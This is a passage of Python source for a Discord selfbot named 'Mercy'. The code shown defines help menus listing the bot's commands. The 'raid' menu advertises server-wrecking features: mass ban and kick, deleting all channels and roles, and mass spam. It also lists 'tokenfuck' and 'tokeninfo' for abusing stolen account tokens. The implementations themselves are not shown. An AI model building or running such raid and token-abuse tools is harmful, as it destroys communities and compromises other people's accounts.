    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}image")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Image commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}avatar <user> - show discord avatar`
    `{Mercy.command_prefix}dogg - random dog image`
    `{Mercy.command_prefix}fox - random fox image`
    `{Mercy.command_prefix}gif - random gif`
    `{Mercy.command_prefix}fry <user> - fry edit user avatar`
    `{Mercy.command_prefix}tweet <name> <text> - fake tweet image`
    `{Mercy.command_prefix}magik <user> - magik?`
    `{Mercy.command_prefix}meme - random meme.`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def text(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}text")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Text commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}abc - abc xd`
    `{Mercy.command_prefix}ascii <text> - text ascii`
    `{Mercy.command_prefix}amongus - wtf amongus in discord?`
    `{Mercy.command_prefix}ddos <user> - fake ddos a user mentioned`
    `{Mercy.command_prefix}lenny - send lenny`
    `{Mercy.command_prefix}lmfao - lmfao animation text`
    `{Mercy.command_prefix}purge <amount> - purge chat`
    `{Mercy.command_prefix}shrug - shrug text`
    `{Mercy.command_prefix}table - table animation text`
    `{Mercy.command_prefix}tableflip - tableflip animation text`
    `{Mercy.command_prefix}unflip - unflip animation text`
    `{Mercy.command_prefix}virus - fake virus animation text`
    `{Mercy.command_prefix}boom - terrorist animation text`
    `{Mercy.command_prefix}horney - 7u7`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def raid(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}raid")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Raid commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}massban - ban all user`
    `{Mercy.command_prefix}masskick - kick all user`
    `{Mercy.command_prefix}massrole - create 250 roles`
    `{Mercy.command_prefix}delchannels - delete all channels`
    `{Mercy.command_prefix}delroles - delete all roles`
    `{Mercy.command_prefix}spamchannels <name> - create 250 channels`
    `{Mercy.command_prefix}spam <amount> <text> - spam text`
    `{Mercy.command_prefix}tokenfuck <token> - fuck discord account`
    `{Mercy.command_prefix}tokeninfo <token> - show all token information.`
    `{Mercy.command_prefix}massunban - unban all user`
    `{Mercy.command_prefix}copy - clone server`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def misc(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}misc")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Misc commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}8ball <question> - 8ball magic??`
    `{Mercy.command_prefix}afk <reason> on - afk mode on`
    `{Mercy.command_prefix}afk <reason> off - afk mode off`
    `{Mercy.command_prefix}embed <text> - embed text`
    `{Mercy.command_prefix}geoip <ip> - geo-location ip`
    `{Mercy.command_prefix}nitro - generate random discord nitro link`
    `{Mercy.command_prefix}poll <question> - start a vote`
    `{Mercy.command_prefix}serverinfo - show all server information`
    `{Mercy.command_prefix}wizz <user> - user information`
    `{Mercy.command_prefix}style1 - mercy console style1`
    `{Mercy.command_prefix}style2 - mercy console style2`
    `{Mercy.command_prefix}style3 - mercy console style3`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def status(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}status")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Status commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}stream <text> - discord streaming status`
    `{Mercy.command_prefix}playing <text> - discord play status`
    `{Mercy.command_prefix}custom - custom animated status`
    `{Mercy.command_prefix}stopstatus - stop your status`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def selfbot(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}selfbot")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Selfbot commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}advance - view your configuration.`
    `{Mercy.command_prefix}cls - clear console`
    `{Mercy.command_prefix}setprefix <prefix> - change your prefix`
    `{Mercy.command_prefix}restart - restart your selfbot`
    `{Mercy.command_prefix}time - shows selfbot usage time`
    
    Your license expires in {license_key.expires}
    Thanks for using, have a nice day or night.
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)


if __name__ == '__main__':
    Init()
